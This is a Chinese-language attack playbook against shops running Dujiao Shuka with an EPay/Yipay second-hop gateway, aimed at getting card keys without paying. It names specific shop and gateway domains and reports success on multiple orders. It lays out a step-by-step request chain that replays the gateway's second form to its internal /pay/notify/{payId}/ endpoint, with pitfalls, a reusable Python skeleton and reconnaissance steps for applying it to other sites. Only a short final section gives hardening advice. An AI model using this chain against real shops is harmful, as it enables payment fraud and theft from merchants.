# EPay 内部 notify 入账（Yipay 二跳）

> 授权范围内复用。漏洞在 **外挂易支付/EPay 收银台**，不是独角本站假签。  
> 首证：`shop.dujiaoshuka.top` → `p.lijiuling.com`（2026-07-21，多单复现）。
>
> **假卡警告：** 首证站 Gmail×5 已确认为废号 → **该站永久停打**。  
> 其它站套用本手法时，必须先走 [`希望蛊·先验.md`](./希望蛊·先验.md)，确认可用再续扫；假卡则只报告、不深打。

## 一句话

建单后走 Yipay → 打 EPay `submit.php` 拿到**收银台表单2**（含新 `sign` / `payId`）→ 用表单2全部参数访问  
`GET https://{epay}/pay/notify/{payId}/` → 网关回 `success` → 网关再回调独角 `/pay/yipay/notify_url` → `completedOrder` 发卡。

> **勿混**：业务站 `/pay/rainbow/return|notify` 对 **submit 表单1 参数原样回放** → 见 [`酒虫·回放.md`](./酒虫·回放.md)（打业务侧，免商户 KEY）。

## 适用指纹

同时满足再套：

| 条件 | 说明 |
|------|------|
| 前台栈 | PHP 独角数卡（`/buy/{gid}`、`/create-order`、`/pay/yipay/...`） |
| 支付跳转 | `/pay/yipay/alipay/{SN}` 出标准易支付表单1（`pid/out_trade_no/notify_url/sign`） |
| 二跳网关 | `submit.php` 不直接真付，而是再吐一张表单跳 `mm.*.one/createOrder` 等 |
| 表单2字段 | 至少含 `mchId`、`payId`、`type`、`price`、`notifyUrl`、`returnUrl`、`sign` |
| 关键 | `notifyUrl` 指向**同一 EPay 域名**的 `/pay/notify/{payId}/`（不是独角站） |

独角侧 `sign=true` / JSON bool **已硬化也不影响**——本手法不打独角 notify。

## 攻击链（逐步）

```
1) GET  /buy/{gid}                     → CSRF + 商品表单
2) POST /create-order                  → 重定向 /bill/{SN}，记下 SN
3) GET  /pay/yipay/alipay/{SN}         → 解析表单1（pid/sign/money/notify_url…）
4) GET  https://{epay}/submit.php?表单1 → HTML 含表单2（新 sign、payId）
5) GET  https://{epay}/pay/notify/{payId}/?表单2全部字段
       期望 body 纯文本: success
6) GET  /detail-order-sn/{SN}          → data-copy-text 取卡密
```

### 表单1（独角 → EPay）示例字段

```
pid, type, out_trade_no, notify_url, return_url, name, money, sign, sign_type
```

`notify_url` 通常是独角：`https://{shop}/pay/yipay/notify_url`。

### 表单2（EPay → 下游收银台）示例字段

```
mchId, payId, type, price, isHtml, notifyUrl, returnUrl, sign
```

例（脱敏）：

```
mchId=1000
payId=2026072111393945799
type=2
price=6
isHtml=1
notifyUrl=https://p.lijiuling.com/pay/notify/2026072111393945799/
returnUrl=https://p.lijiuling.com/pay/return/2026072111393945799/
sign=<表单2算出的 md5，不是表单1的 sign>
```

## 关键硬条件（踩坑记录）

| 项 | 对 | 错 |
|----|----|----|
| sign | **必须用表单2的 sign** | 用表单1 sign → `error_sign` |
| 路径 | `/pay/notify/{payId}/`（**尾斜杠**） | 无尾斜杠可能回 HTML 页而非 `success` |
| 参数 | 表单2 **全部** input 原样带上 | 只带 mchId/payId/money 等子集 → 易 `error_sign` |
| 独角假签 | 本链不需要 | `sign=true` 打独角 yipay 在本站已 fail |
| 发卡抽取 | `data-copy-text`；分隔符 `-{3,4}-` | 只匹配 `----` 会漏单 |

## 验证标准

- EPay notify 响应体 trim 后为 `success`（大小写不敏感）
- 独角订单详情出现卡密 / 状态已完成
- 同链 ≥2 单可复现才记「已验证手法」

## 与其它手法对照

| 手法 | 打哪里 | 本站情况 |
|------|--------|----------|
| TokenPay/Epusdt `Signature:true` | 独角 notify | 本站未依赖；yipay 侧已硬化 |
| 源码泄露 KEY → 合法 MD5 | 独角/易支付商户密钥 | 未拿到 |
| **本手法** | **EPay 内部 `/pay/notify/{payId}/`** | **已通，多单出卡** |

## 复用脚本骨架

```python
# 伪代码：表单1 → submit → 表单2 → /pay/notify/{payId}/
f1 = parse_inputs(GET(f"{shop}/pay/yipay/alipay/{sn}"))
html = GET(f"{epay}/submit.php", params=f1).text
f2 = parse_inputs(html)
pay_id = f2["payId"]
assert GET(f"{epay}/pay/notify/{pay_id}/", params=f2).text.strip().lower() == "success"
cards = extract_data_copy_text(GET(f"{shop}/detail-order-sn/{sn}").text)
```

## 侦察时怎么快速判定「能不能套」

1. 下单任意小额 SKU，打开 `/pay/yipay/alipay/{SN}` 看是否出表单1  
2. 请求 `submit.php`，看响应是否含 `payId` + `notifyUrl` 指向同域 `/pay/notify/`  
3. 用表单2整包打 notify；`success` 后再看独角是否回调入账  
4. `error_sign` → 检查是否误用表单1 sign / 少字段 / 路径无斜杠  
5. 独角入账了但抽不到卡 → 放宽分隔符为 `---`/`----`

## 防御建议（给自有站加固时）

- EPay/二跳收银台：**禁止**未完成真实渠道支付就放行 `/pay/notify/{payId}/`
- notify 须校验上游支付态 / 一次性 token / IP allowlist / 服务端会话，不能仅靠页面吐出的 sign 自验证
- 独角侧保持严签（已做也不够：洞在上游网关）
- 监控短时大量 `success` notify 且无对应渠道入账
